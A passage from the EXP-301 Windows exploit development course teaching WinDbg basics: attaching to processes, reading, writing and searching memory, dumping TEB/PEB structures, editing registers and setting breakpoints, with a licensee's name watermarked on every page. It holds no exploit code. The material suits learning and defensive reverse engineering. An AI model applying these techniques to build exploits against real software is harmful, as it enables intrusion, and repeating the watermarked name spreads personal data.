13 (Immunity Inc, 2019), https://www.immunityinc.com/products/debugger/index.html 
14 (Microsoft, 2019), https://developer.microsoft.com/en-us/windows/hardware/download-windbg 
15 (Microsoft, 2019), https://docs.microsoft.com/en-gb/windows-hardware/drivers/debugger/debugging-using-windbg-preview 
16 (Microsoft, 2019), https://docs.microsoft.com/en-gb/windows-hardware/drivers/debugger/time-travel-debugging-overview 
17 (Microsoft, 2017), https://docs.microsoft.com/en-gb/windows-hardware/drivers/debugger/windbg-scripting-preview 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
26 
Using a debugger allows us to view and interact with the memory and execution flow of 
applications. The memory space of most operating systems, including Windows, is divided into 
two parts, kernel-mode (ring 0) and user-mode (ring 3). Throughout this course, we will interact 
with the user-mode and avoid elements related to the kernel-mode. 
The CPU processes code at a binary level, which is difficult for people to read and understand. 
The Assembly programming language introduces a one-to-one mapping between the binary 
content and programming language. 
Even though assembly language is supposed to be human-readable, it’s still a low-level 
language,18 and it takes time to master. An opcode is a binary sequence interpreted by the CPU as 
a specific instruction. This is shown in the debugger as hexadecimal values along with a 
translation into assembly language. 
2.2.2 WinDbg Interface 
Now that we’ve discussed the basics of debugging, let’s examine WinDbg. When we log into the 
student VM, we’ll click on the Start Menu and search for WinDbg. Once we open it, we are met 
with a plain screen, as shown in Figure 5. 
 
Figure 5: Starting screen for WinDbg 
 
18 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Low-level_programming_language 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
27 
 
Please note that if we use the icon pinned to the taskbar of our dedicated 
Windows client VM, WinDbg will load with our preset workspace. 
Let’s practice using WinDbg (x86). We’ll start by launching Notepad and WinDbg on our lab VM. 
To attach the debugger to Notepad, we will switch to WinDbg, access the File menu, and select 
Attach to a Process… (Figure 6) or press the ^ key. 
 
Figure 6: Attach to process 
This brings up a window listing all the processes that can be attached, as shown in Figure 7. 
 
Figure 7: List of processes to attach to 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
28 
 
There are different ways to sort this list if it’s not open already. System order is the default, which 
means the processes are sorted from newest to oldest. We can also sort by the process ID or 
executable name, making it easier to locate a running process. 
Let’s locate our newly-created Notepad process, which will be at the bottom of the list by default. 
After selecting the Notepad process, we click OK, and WinDbg will attach to the process. When 
WinDbg attaches to the process, it pauses the execution flow, allowing us to interact with the 
debugger. 
The debugger injects a software breakpoint19 by overwriting the current instruction in memory 
with an INT 3 assembly instruction. 
While we will get back to the concepts of breakpoints in more detail shortly, it is 
important to note that if we do not enter a ‘g’20 (Go) at the command window 
prompt, the application will stay suspended. 
2.2.3 Understanding the Workspace 
Without any customization, the default workspace looks quite lean. When an application is 
attached, WinDbg displays a single floating style Command window, as shown in Figure 8. 
 
Figure 8: Default workspace of WinDbg 
 
19 (Intel® System Debugger - System Debug (Legacy) User and Reference Guide, 2019), https://software.intel.com/en-us/system-
debug-legacy-user-guide-hardware-and-software-breakpoints 
20 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/g--go- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
29 
 
If we launch WinDbg from the taskbar, we notice it loads with a pre-set workspace21 layout. The 
layout was designed to provide the most important windows for this course: the Disassembly and 
Command windows. Feel free to modify the workspace, but these will be used the most during 
this course. 
Our customized workspace has docked the Command window and added the Disassembly view, 
which shows the next instructions to be executed by the CPU. 
 
Figure 9: Default workspace of WinDbg 
When creating a workspace, it is important to know that there are several additional windows 
available through the View menu (Figure 10). 
 
21 (Burlingame, Zach, 2011), http://www.zachburlingame.com/2011/12/customizing-your-windbg-workspace-and-color-scheme/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
30 
 
Figure 10: WinDbg Views 
We can arrange different views and dock them together, giving us access to multiple views at 
once. The views to have on the screen is often a matter of personal taste. 
The GUI offers a great deal of functionality. But with practice, the Command 
window will allow us to interact with WinDbg much faster and use more 
advanced features such as the built-in scripting language. 
Once we’ve set up the views, we can save the workspace through the File menu. This allows us to 
use the workspace across different debugging sessions. 
2.2.3.1 Exercises 
1. 
Open WinDbg and attach it to the Notepad process. 
2. 
Explore different WinDbg windows and get a feel for the layout. 
2.2.4 Debugging Symbols 
Symbol files permit WinDbg to reference internal functions, structures, and global variables using 
names instead of addresses. Configuring the symbols path allows WinDbg to fetch symbol files 
for native Windows executables and libraries from the official Microsoft symbol store. 
The symbols files (with extension .PDB) are created when the native Windows files are compiled 
by Microsoft. Microsoft does not provide symbol files for all library files, and third party 
applications may have their own symbol files. 
The student VM is already configured, but it is important to understand how to set up the 
debugging environment. 
We access the symbol settings through the File > Symbol File Path… menu, as shown in Figure 11. 
A commonly used symbol path is C:\symbols. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
31 
 
Figure 11: Setting Symbol File Path 
Once the symbol path is configured and an Internet connection is available, we can force the 
download of available symbols for all loaded modules before beginning any actual debugging 
with .reload: 
0:003> .reload /f 
Reloading current modules 
..*** ERROR: Symbol file could not be found.  Defaulted to export symbols for 
C:\Windows\WinSxS\x86_microsoft.windows.common-
controls_6595b64144ccf1df_6.0.16299.64_none_14403bb93691f395\COMCTL32.dll -  
.. 
 
Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take 
too long. 
Run !sym noisy before .reload to track down problems loading symbols. 
 
............................................... 
 
************* Symbol Loading Error Summary ************** 
Module name            Error 
COMCTL32               - This error is unknown: 0x800c2eff. Please contact the 
debugger team to report this error. (Mail: windbgfb@microsoft.com) 
 
You can troubleshoot most symbol related issues by turning on symbol loading 
diagnostics (!sym noisy) and repeating the command that caused symbols to be loaded. 
You should also verify that your symbol search path (.sympath) is correct. 
Listing 1 - Reloading the symbols from the Microsoft Symbols Server 
In some cases, we would receive the above error if there is a module where no symbol file exists. 
This error can also occur if we request a symbol file after a Windows update. Typically, this does 
not pose a problem because the symbol files for the core modules are available within a few days 
of patches being released. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
32 
2.3 Accessing and Manipulating Memory from WinDbg 
Inspecting and manipulating the contents of process memory is a critical step during exploit 
development. WinDbg provides us with a set of powerful commands for these purposes. In this 
section, we will focus on accessing and manipulating memory. 
2.3.1 Unassemble from Memory 
We can display the assembly translation of a specified program code in memory with the WinDbg 
u22 command. This is useful as it allows us to inspect the assembly code of certain Windows 
APIs as well as any part of the code of the current running program. 
The u command accepts either a single memory address or a range of memory as an argument, 
which will tell it where to start disassembling from. If we do not specify this argument, the 
disassembly will begin at the memory address stored in EIP. 
With our debugger attached to the notepad.exe process, let’s try to inspect the assembly code of 
the kernel32!GetCurrentThread Windows API. We select Break from the Debug menu to halt 
execution and then use the u command to disassemble the target function as follows: 
0:003> u kernel32!GetCurrentThread 
KERNEL32!GetCurrentThread: 
770b5910 6afe            push    0FFFFFFFEh 
770b5912 58              pop     eax 
770b5913 c3              ret 
770b5914 cc              int     3 
770b5915 cc              int     3 
770b5916 cc              int     3 
770b5917 cc              int     3 
770b5918 cc              int     3 
Listing 2 - Disassembly of the kernel32!GetCurrentThread Windows API 
As shown in the listing above, we can provide a function symbol in place of a memory address, as 
the debugger will translate the symbol automatically. 
2.3.1.1 Exercises 
1. 
Use the u command to unassemble the kernel32!GetCurrentThread Windows API. 
2. 
Can you explain the assembly code? What is the result of this function and how it is returned 
to the caller? 
2.3.2 Reading from Memory 
We can read process memory content using the display command23 followed by the size 
indicator. The listings below show the different available display format options. 
 
22 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/u--unassemble- 
23 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/d--da--db--dc--dd--dd--df--dp--dq--du--dw-
-dw--dyb--dyd--display-memor 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
33 
 
For a complete list of display command options, please refer to the Microsoft’s 
online WinDbg manual.24 
First, we can display bytes through the db command as shown in Listing 3. 
0:000> db esp 
00faf974  89 ab 1b 77 78 68 1f c1-50 ab 1b 77 50 ab 1b 77  ...wxh..P..wP..w 
00faf984  00 00 00 00 78 f9 fa 00-00 00 00 00 ec f9 fa 00  ....x........... 
00faf994  80 a3 18 77 90 ae fa b6-00 00 00 00 b4 f9 fa 00  ...w............ 
00faf9a4  a4 de e2 76 00 00 00 00-80 de e2 76 8a ae aa ca  ...v.......v.... 
00faf9b4  fc f9 fa 00 be 00 15 77-00 00 00 00 24 68 1f c1  .......w....$h.. 
00faf9c4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ 
00faf9d4  00 00 00 00 00 00 00 00-00 00 00 00 24 68 1f c1  ............$h.. 
00faf9e4  c0 f9 fa 00 00 00 00 00-04 fa fa 00 80 a3 18 77  ...............w 
Listing 3 - Display bytes - db 
The listing above uses the ESP register instead of an explicit memory address. The display 
command also accepts explicit addresses (db 
00faf974) or symbol names (db 
kernel32!WriteFile). 
To display data in a larger size format we can use dw: 
0:000> dw esp 
00faf974  ab89 771b 6878 c11f ab50 771b ab50 771b 
00faf984  0000 0000 f978 00fa 0000 0000 f9ec 00fa 
00faf994  a380 7718 ae90 b6fa 0000 0000 f9b4 00fa 
00faf9a4  dea4 76e2 0000 0000 de80 76e2 ae8a caaa 
00faf9b4  f9fc 00fa 00be 7715 0000 0000 6824 c11f 
00faf9c4  0000 0000 0000 0000 0000 0000 0000 0000 
00faf9d4  0000 0000 0000 0000 0000 0000 6824 c11f 
00faf9e4  f9c0 00fa 0000 0000 fa04 00fa a380 7718 
Listing 4 - Display words - dw 
As shown above, dw prints WORDs (two bytes) rather than single bytes. 
We can also display DWORDs (four bytes) with dd (Listing 5): 
0:000> dd esp 
00faf974  771bab89 c11f6878 771bab50 771bab50 
00faf984  00000000 00faf978 00000000 00faf9ec 
00faf994  7718a380 b6faae90 00000000 00faf9b4 
00faf9a4  76e2dea4 00000000 76e2de80 caaaae8a 
00faf9b4  00faf9fc 771500be 00000000 c11f6824 
00faf9c4  00000000 00000000 00000000 00000000 
00faf9d4  00000000 00000000 00000000 c11f6824 
00faf9e4  00faf9c0 00000000 00fafa04 7718a380 
Listing 5 - Display dwords - dd 
 
24 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/d--da--db--dc--dd--dd--df--dp--dq--du--dw-
-dw--dyb--dyd--display-memor 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
34 
We can display QWORDs (eight bytes) with dq, as shown in Listing 6. 
0:002> dq 00faf974   
00faf974  c11f6878`771bab89 771bab50`771bab50 
00faf984  00faf978`00000000 00faf9ec`00000000 
00faf994  b6faae90`7718a380 00faf9b4`00000000 
00faf9a4  00000000`76e2dea4 caaaae8a`76e2de80 
00faf9b4  771500be`00faf9fc c11f6824`00000000 
00faf9c4  00000000`00000000 00000000`00000000 
00faf9d4  00000000`00000000 c11f6824`00000000 
00faf9e4  00000000`00faf9c0 7718a380`00fafa04 
Listing 6 - Display qwords - dq 
Notice that in Listing 6, we replaced the ESP register with its hexadecimal value. 
In addition, we can conveniently display ASCII characters in memory along with WORDs or 
DWORDs with dW and dc, respectively. 
Don’t confuse ‘dW’ with ‘dw’, which is only for the WORD value. 
Listing 7 shows us the ASCII characters on the right-hand side of the output, and the equivalent 
hexadecimal values on the left. 
0:000> dc KERNELBASE 
75100000  00905a4d 00000003 00000004 0000ffff  MZ.............. 
75100010  000000b8 00000000 00000040 00000000  ........@....... 
75100020  00000000 00000000 00000000 00000000  ................ 
75100030  00000000 00000000 00000000 000000f8  ................ 
75100040  0eba1f0e cd09b400 4c01b821 685421cd  ........!..L.!Th 
75100050  70207369 72676f72 63206d61 6f6e6e61  is program canno 
75100060  65622074 6e757220 206e6920 20534f44  t be run in DOS  
75100070  65646f6d 0a0d0d2e 00000024 00000000  mode....$....... 
 
0:000> dW KERNELBASE+0x40 
75100040  1f0e 0eba b400 cd09 b821 4c01 21cd 6854  ........!..L.!Th 
75100050  7369 7020 6f72 7267 6d61 6320 6e61 6f6e  is program canno 
75100060  2074 6562 7220 6e75 6920 206e 4f44 2053  t be run in DOS  
75100070  6f6d 6564 0d2e 0a0d 0024 0000 0000 0000  mode....$....... 
75100080  abc8 b273 ca8c e11d ca8c e11d ca8c e11d  ..s............. 
75100090  b285 e18e ca88 e11d ca8c e11c c9bb e11d  ................ 
751000a0  5638 e1f2 ca8f e11d 5638 e1ee ca83 e11d  8V......8V...... 
751000b0  5638 e1ec ca84 e11d 5638 e1ef c8be e11d  8V......8V...... 
Listing 7 - The display command and ASCII representation of the data 
The default length when displaying data is 0x80 bytes. We can change this value by using the L 
parameter with display commands, as shown below: 
0:000> dd esp L4 
00faf974  771bab89 c11f6878 771bab50 771bab50 
 
0:000> dd esp L10 
00faf974  771bab89 c11f6878 771bab50 771bab50 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
35 
00faf984  00000000 00faf978 00000000 00faf9ec 
00faf994  7718a380 b6faae90 00000000 00faf9b4 
00faf9a4  76e2dea4 00000000 76e2de80 caaaae8a 
 
0:000> dW KERNELBASE L2 
75100000  5a4d 0090                               MZ.. 
 
0:000> db KERNELBASE L2 
75100000  4d 5a                                   MZ 
Listing 8 - Display amount using L 
Notice how the value passed to the L parameter changes the amount of data displayed. This 
depends on the requested format. The dW L2 command outputs two WORDS while db L2 
outputs two bytes. 
WinDbg allows us to display the memory content at a specified address as either ASCII format 
using the da command or Unicode format using the du command. We will see how these 
commands can be used later in the module. 
We can also display data through the pointer to data command poi, which displays data 
referenced from a memory address. In the listing below, the display DWORD command dd is used 
twice to emulate a memory dereference. 
0:002> dd esp L1 
00faf974  771bab89 
 
0:002> dd 771bab89 
771bab89  c03307eb 658bc340 fc45c7e8 fffffffe 
771bab99  d0e8006a ccfff955 cccccccc cccccccc 
771baba9  cccccccc 8bcccccc ec8b55ff 180d8b64 
771babb9  8b000000 81890845 00000f24 0004c25d 
771babc9  cccccccc 8bcccccc ec8b55ff 0018a164 
771babd9  b0ff0000 00000f24 e80875ff fffc6c77 
771babe9  0004c25d cccccccc cccccccc cccccccc 
771babf9  cccccccc 8bcccccc ec8b55ff 640875ff 
Listing 9 - Using the dd command to emulate a pointer dereference 
We can achieve the same result by using dd and poi together in a single line: 
0:002> dd poi(esp) 
771bab89  c03307eb 658bc340 fc45c7e8 fffffffe 
771bab99  d0e8006a ccfff955 cccccccc cccccccc 
771baba9  cccccccc 8bcccccc ec8b55ff 180d8b64 
771babb9  8b000000 81890845 00000f24 0004c25d 
771babc9  cccccccc 8bcccccc ec8b55ff 0018a164 
771babd9  b0ff0000 00000f24 e80875ff fffc6c77 
771babe9  0004c25d cccccccc cccccccc cccccccc 
771babf9  cccccccc 8bcccccc ec8b55ff 640875ff 
Listing 10 - Using the poi command to dereference a pointer 
These display commands are very useful. In the next section, we will show even more powerful 
ways of displaying data. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
36 
2.3.2.1 Exercise 
1. 
Use different versions of dd to dump data from memory and attempt to combine the display 
commands with poi. 
2.3.3 Dumping Structures from Memory 
One of the advantages of WinDbg is the ability to use Microsoft symbols for core modules (DLLs). 
Symbol files use structures, and structures are a programming concept that accepts user-defined 
data types that can combine different data items. 
Different software may use structures extensively, depending on its complexity and functionality. 
While such structures would be easy to read by examining the source code, the issue appears 
during the compilation process where the code gets translated to binary values. This means we 
can not simply read the structures. However, we have a solution. 
The display command has a specific option dedicated to dumping structures from memory by 
using the available symbol files. 
The Display Type dt25 command takes the name of the structure to display as an argument and, 
optionally, a memory address from which to dump the structure data. The structure needs to be 
provided by one of the loaded symbol files. The Thread Environment Block26 (TEB) structure 
displayed in the example below is without any additional arguments. 
0:000> dt ntdll!_TEB 
   +0x000 NtTib            : _NT_TIB 
   +0x01c EnvironmentPointer : Ptr32 Void 
   +0x020 ClientId         : _CLIENT_ID 
   +0x028 ActiveRpcHandle  : Ptr32 Void 
   +0x02c ThreadLocalStoragePointer : Ptr32 Void 
   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB 
   +0x034 LastErrorValue   : Uint4B 
   +0x038 CountOfOwnedCriticalSections : Uint4B 
   +0x03c CsrClientThread  : Ptr32 Void 
   ... 
   +0xfe0 ResourceRetValue : Ptr32 Void 
   +0xfe4 ReservedForWdf   : Ptr32 Void 
   +0xfe8 ReservedForCrt   : Uint8B 
   +0xff0 EffectiveContainerId : _GUID 
Listing 11 - Dumping structures using dt 
In this case, the optional address for the structure was not provided, and WinDbg shows the 
structure fields as well as their offsets. 
In the output, each specified field for that structure is shown at the relative specific offset into the 
structure. This is followed by the field name and its data type. For cases where a field points to a 
nested structure, the field data type is replaced by the correct sub-structure type. The sub-
structure type can also be identified with an underscore (_) leading the field type, and the field 
type name in capital letters. 
 
25 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/dt--display-type- 
26 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
37 
In Listing 11, notice that the NtTib field at offset 0x0 is a nested structure of type _NT_TIB. 
If the memory address of a structure is known, it can be passed to the dt command as an 
additional parameter. 
Continuing the previous example, we can use dt with the address of the TEB by leveraging the 
$teb pseudo27 register. 
A pseudo register is a WinDbg variable that can be used during calculations. We’ll 
explain this in more detail in the next section. 
By supplying the -r flag to the dt command, WinDbg will recursively display nested structures 
where present. 
:002> dt -r ntdll!_TEB @$teb 
   +0x000 NtTib            : _NT_TIB 
      +0x000 ExceptionList    : 0x004bfb68 _EXCEPTION_REGISTRATION_RECORD 
         +0x000 Next             : 0x004bfbc4 _EXCEPTION_REGISTRATION_RECORD 
         +0x004 Handler          : 0x77b37230           _EXCEPTION_DISPOSITION  
ntdll!_except_handler4+0 
      +0x004 StackBase        : 0x004c0000 Void 
      +0x008 StackLimit       : 0x004bc000 Void 
      +0x00c SubSystemTib     : (null)  
      +0x010 FiberData        : 0x00001e00 Void 
      +0x010 Version          : 0x1e00 
      +0x014 ArbitraryUserPointer : (null)  
      +0x018 Self             : 0x00302000 _NT_TIB 
         +0x000 ExceptionList    : 0x004bfb68 _EXCEPTION_REGISTRATION_RECORD 
         +0x004 StackBase        : 0x004c0000 Void 
         +0x008 StackLimit       : 0x004bc000 Void 
         +0x00c SubSystemTib     : (null)  
         +0x010 FiberData        : 0x00001e00 Void 
         +0x010 Version          : 0x1e00 
         +0x014 ArbitraryUserPointer : (null)  
         +0x018 Self             : 0x00302000 _NT_TIB 
   +0x01c EnvironmentPointer : (null)  
   +0x020 ClientId         : _CLIENT_ID 
      +0x000 UniqueProcess    : 0x00001640 Void 
      +0x004 UniqueThread     : 0x0000133c Void 
   +0x028 ActiveRpcHandle  : (null)  
   +0x02c ThreadLocalStoragePointer : (null)  
   +0x030 ProcessEnvironmentBlock : 0x002ff000 _PEB 
      +0x000 InheritedAddressSpace : 0 '' 
      +0x001 ReadImageFileExecOptions : 0 '' 
      +0x002 BeingDebugged    : 0x1 '' 
      +0x003 BitField         : 0x4 '' 
      +0x003 ImageUsesLargePages : 0y0 
      +0x003 IsProtectedProcess : 0y0 
      +0x003 IsImageDynamicallyRelocated : 0y1 
 
27 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/pseudo-register-syntax 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
38 
      +0x003 SkipPatchingUser32Forwarders : 0y0 
      +0x003 IsPackagedProcess : 0y0 
      +0x003 IsAppContainer   : 0y0 
      +0x003 IsProtectedProcessLight : 0y0 
      +0x003 SpareBits        : 0y0 
      +0x004 Mutant           : 0xffffffff Void 
      +0x008 ImageBaseAddress : 0x010b0000 Void 
      +0x00c Ldr              : 0x77baaaa0 _PEB_LDR_DATA 
[SNIP...] 
Listing 12 - Using dt with a memory address 
We can also display specific fields in the structure by passing the name of the field as an 
additional parameter. The following is an example for the TEB ThreadLocalStoragePointer field: 
0:000> dt ntdll!_TEB @$teb ThreadLocalStoragePointer 
   +0x02c ThreadLocalStoragePointer : 0x02b31bf8 Void 
Listing 13 - Dumping information of a specific structure field only 
WinDbg can also display the size of a structure extracted from a symbol file. This is because 
some Windows APIs will take a structure as an argument, so we need to be able to determine the 
size of a certain structure. To get this info, we use the WinDbg sizeof command as follows: 
0:000> ?? sizeof(ntdll!_TEB) 
unsigned int 0x1000 
Listing 14 - Using the sizeof command to gather the size in bytes of the TEB structure 
Leveraging symbols helps the debugging process tremendously by providing identifiable names 
instead of memory addresses and hexadecimal values. We should use symbol files if they have 
been released by the developer. 
2.3.3.1 Exercise 
1. 
Experiment with the dt command and dump some structures such as the PEB along with 
their contents at a specific memory address. 
2.3.4 Writing to Memory 
After exploring commands to display and dump information from memory, let’s focus on 
modifying process memory data. The main WinDbg command for this job is e\*,28 the edit 
command. The same size modifiers used for the display command also apply to the edit 
command. Below is an example showing how to edit a DWORD pointed to by ESP. 
0:000> dd esp L1 
003cb710  00000000 
 
0:000> ed esp 41414141 
 
0:000> dd esp L1 
003cb710  41414141 
Listing 15 - Simple edit command to modify a single DWORD 
 
28 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/e--ea--eb--ed--ed--ef--ep--eq--eu--ew--eza-
-ezu--enter-values- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
39 
As with the display command, we can directly write or modify ASCII characters using ea or 
Unicode characters using eu. In the following example (Listing 16), we wrote ASCII text (“Hello”) to 
the memory address pointed to by the ESP register. 
0:000> da esp 
003cb710  "" 
 
0:000> ea esp "Hello" 
 
0:000> da esp 
003cb710  "Hello" 
Listing 16 - Using the ea command 
Writing ASCII or Unicode strings directly to memory can help to quickly translate them into hex 
format, which we can use in our exploit. 
For example, let’s imagine we have a shellcode that writes a file to disk. The path needs to be 
supplied as bytes inside our shellcode. By using WinDbg, we can write the path directly to 
memory. Then within our exploit code, we can copy the bytes displayed through the db command 
into the shellcode. 
2.3.4.1 Exercises 
1. 
Experiment with the memory write commands and modify the contents at ESP as both a 
binary value and a Unicode string. 
2. 
What happens if we try to modify the memory where EIP is pointing? 
2.3.5 Searching the Memory Space 
When performing exploit development or reverse engineering, it’s common to search the process 
memory space for a specific pattern. In WinDbg, we can search the debugged process memory 
space by using the s command.29 
First, let’s use our newly-acquired skill of editing memory to change the DWORD pointed to by the 
ESP register to 0x41414141. Then we can use the search command to find this value in the 
application’s memory. 
To perform a search we need s and four additional parameters: the memory type to search for, 
the starting point of memory to search, the length of memory to search, and the pattern to search 
for. 
When searching for the memory type DWORD, we use -d. Next, we set the searching address, 
which starts at 0. We then set the length for the command to search. To search the whole 
memory range, we enter L and the value “?80000000”, which signifies the entire process’s 
memory space (more on the “?” keyword shortly). Finally, we enter the pattern that we want to 
search for, in this case, 41414141. 
Listing 17 displays a search for 41414141 in memory. 
 
29 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/s--search-memory- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
40 
0:000> ed esp 41414141 
 
0:000> s -d 0 L?80000000 41414141 
003cb710  41414141 0000006f 80000000 00000007  AAAAo........... 
Listing 17 - Searching for the 0x41414141 DWORD 
With a good understanding of the search function, let’s perform a search of the entire user 
process memory space for a well-known ASCII string. 
0:000> s -a 0 L?80000000 "This program cannot be run in DOS mode" 
000e004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
007a004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
0089004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
008b004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
009f004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
00b6004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
00b8004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
00c1004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
010b004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
063610ae  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
063626b6  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
06368ebe  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can 
... 
Listing 18 - Using the search command across all usermode memory 
The ASCII string we used in our search command from Listing 18 is present in every Windows 
executable as part of the PE header. This means it is found in every module that is loaded in the 
memory space of the notepad.exe process. In addition to finding the ASCII string, WinDbg also 
presents us with the memory addresses where the strings are located in each module. 
Being able to identify where we can find a specific pattern in memory as we did in the above 
example can be vital during reverse engineering and exploit development. 
2.3.5.1 Exercises 
1. 
Use the edit command to create a QWORD in memory and search for it with the search 
command. 
2. 
Use the edit command to create a Unicode string and search for it with the search 
command. 
2.3.6 Inspecting and Editing CPU Registers in WinDbg 
Understanding how to inspect CPU register values is as important as the ability to access 
memory data. We can access registers using the r command. 
This command is very powerful because it allows us to not only display register values, but also 
to modify them. 
In Listing 19 we show how to dump all registers as well as a single one by using the r command: 
0:000> r 
eax=0008f24c ebx=00000006 ecx=0ad16828 edx=000f5e6c esi=0013f7d0 edi=00000006 
eip=751c3b70 esp=0008f228 ebp=0008f25c iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
41 
KERNELBASE!WriteFile: 
751c3b70 6a18            push    18h 
 
0:000> r ecx 
ecx=0ad16828 
Listing 19 - Inspecting register values 
We can also modify ECX with r ecx= followed by the new register value. 
0:000> r ecx=41414141 
 
0:000> r 
eax=0008f24c ebx=00000006 ecx=41414141 edx=000f5e6c esi=0013f7d0 edi=00000006 
eip=751c3b70 esp=0008f228 ebp=0008f25c iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206 
KERNELBASE!WriteFile: 
751c3b70 6a18            push    18h 
Listing 20 - Setting register values 
Being able to modify memory and registers while debugging can speed up the reverse 
engineering and exploit development process. 
2.3.6.1 Exercise 
1. 
Use the r command to display the contents of all registers, then single registers. Practice 
modifying them. 
2.4 Controlling the Program Execution in WinDbg 
WinDbg can set breakpoints30 to halt the execution flow at desired locations in the code. There 
are two different types of breakpoints; software and processor/hardware breakpoints. 
Breakpoints controlled directly by the debugger are known as software breakpoints. Breakpoints 
controlled by the processor and set through the debugger are known as hardware breakpoints.31 
In the following section, we will experiment with setting up various software and hardware 
breakpoints while attached to the notepad.exe process. We will learn how to set software 
breakpoints at particular Windows APIs, some of which are not yet loaded in the memory space 
of our application. We will also use hardware breakpoints to determine exactly when our data is 
accessed. 
2.4.1 Software Breakpoints 
When placing a software breakpoint, WinDbg temporarily replaces the first opcode of the 
instruction where we want execution to halt with an INT 3 assembly instruction. The advantage of 
software breakpoints is that we are allowed to set as many as we want. 
Let’s try this out. With WinDbg attached to Notepad, we are going to set a breakpoint that will halt 
the execution flow of the application when changes are being saved to a file. To do this, we are 
 
30 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/methods-of-controlling-breakpoints 
31 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/processor-breakpoints---ba-breakpoints- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
42 
going to set a breakpoint at the Windows WriteFile API,32 which is commonly used to write data to 
a specified file or input/output (I/O) device. 
We start by using bp along with the location where we want the application to stop, which in this 
case is the kernel32!WriteFile function. 
After setting our breakpoint, we can use the bl command to list all the breakpoints and make 
sure we are set for our test. 
0:005> bp kernel32!WriteFile 
 
0:000> bl 
     0 e Disable Clear  767ec6d0     0001 (0001)  0:**** KERNEL32!WriteFile 
